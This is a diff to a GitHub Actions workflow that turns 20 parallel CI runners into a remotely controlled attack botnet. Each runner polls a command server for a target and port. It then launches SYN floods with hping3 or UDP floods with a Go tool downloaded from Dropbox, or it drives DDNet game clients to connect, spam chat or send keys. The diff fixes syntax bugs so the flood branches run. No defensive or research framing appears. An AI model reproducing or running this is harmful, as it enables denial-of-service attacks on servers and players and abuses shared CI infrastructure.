@@ -11,39 +11,25 @@ jobs:
         machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: Preparing Environment
+      - name: 1. Preparing Environment
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq xvfb xdotool libsdl2-2.0-0 libcurl4 libfreetype6 libgl1 libglx-mesa0 libglu1-mesa libnotify4 libpng16-16 libvorbisfile3 libgl1-mesa-dri openbox
 
-      - name: Download Tools
+      - name: 2. Download Tools
         run: |
-          # 1. Скачиваем стрессер
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
           
-          # 2. ИСПРАВЛЕННЫЙ БЛОК DDNET (добавлена директория /downloads/)
-          echo "Finding DDNet link..."
-          RAW_LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
-          
-          if [[ "$RAW_LINK" == http* ]]; then
-            FULL_URL="$RAW_LINK"
-          elif [[ "$RAW_LINK" == /* ]]; then
-            FULL_URL="https://ddnet.org$RAW_LINK"
-          else
-            # Вот тут была ошибка! Не хватало папки downloads
-            FULL_URL="https://ddnet.org/downloads/$RAW_LINK"
-          fi
-          
-          FULL_URL=$(echo "$FULL_URL" | xargs)
-          echo "Final URL: $FULL_URL"
-          wget -O ddnet.tar.xz "$FULL_URL"
-          
+          echo "Fetching DDNet..."
+          LINK=$(curl -s https://ddnet.org/downloads/ | grep -oP 'href="\K[^"]+linux_x86_64\.tar\.xz' | head -n 1)
+          if [[ "$LINK" == http* ]]; then FINAL_URL="$LINK"; else FINAL_URL="https://ddnet.org/downloads/$(basename $LINK)"; fi
+          wget -O ddnet.tar.xz "$FINAL_URL"
           tar -xf ddnet.tar.xz
           mv DDNet-* ddnet_folder
 
-      - name: Loop Control Center
+      - name: 3. Loop Control Center
         env:
           CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
@@ -64,6 +50,7 @@ jobs:
 
           echo "READY..."
           LAST_ID="0"
+          
           while true; do
             RESPONSE=$(curl -s --max-time 5 "$CONTROL_URL")
             ID=$(echo "$RESPONSE" | jq -r '.id // 0')
@@ -74,6 +61,7 @@ jobs:
               TARGET=$(echo "$RESPONSE" | jq -r '.target')
               PORT=$(echo "$RESPONSE" | jq -r '.port')
               CONNS=$(echo "$RESPONSE" | jq -r '.conns')
+              MSG=$(echo "$RESPONSE" | jq -r '.msg')
 
               if [[ "$TYPE" == "connect" || "$TYPE" == "chat" || "$TYPE" == "disconnect" || "$TYPE" == "key" ]]; then
                 WIDS=$(xdotool search --class "DDNet" 2>/dev/null || echo "")
@@ -81,12 +69,12 @@ jobs:
                   xdotool windowactivate --sync $WID
                   if [ "$TYPE" == "connect" ]; then
                     xdotool key F1; sleep 0.2; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
-                  elif[ "$TYPE" == "chat" ]; then
-                    xdotool key t; sleep 0.2; xdotool type "$TARGET"; xdotool key Return
+                  elif [ "$TYPE" == "chat" ]; then
+                    xdotool key t; sleep 0.3; xdotool type "$MSG"; xdotool key Return
                   elif [ "$TYPE" == "disconnect" ]; then
                     xdotool key F1; sleep 0.2; xdotool type "disconnect"; xdotool key Return; xdotool key F1
                   elif [ "$TYPE" == "key" ]; then
-                    xdotool key "$TARGET"
+                    xdotool key "$MSG"
                   fi
                 done
               fi
@@ -97,7 +85,7 @@ jobs:
                 sudo hping3 --flood -S -p $PORT $TARGET &
               elif [ "$TYPE" == "udp" ]; then
                 go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 600s -r 0 -t 1s &
-              elif[ "$TYPE" == "udp-ddnet" ]; then
+              elif [ "$TYPE" == "udp-ddnet" ]; then
                 go run ../bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 600s -r 0 -t 1s &
               fi
             fi
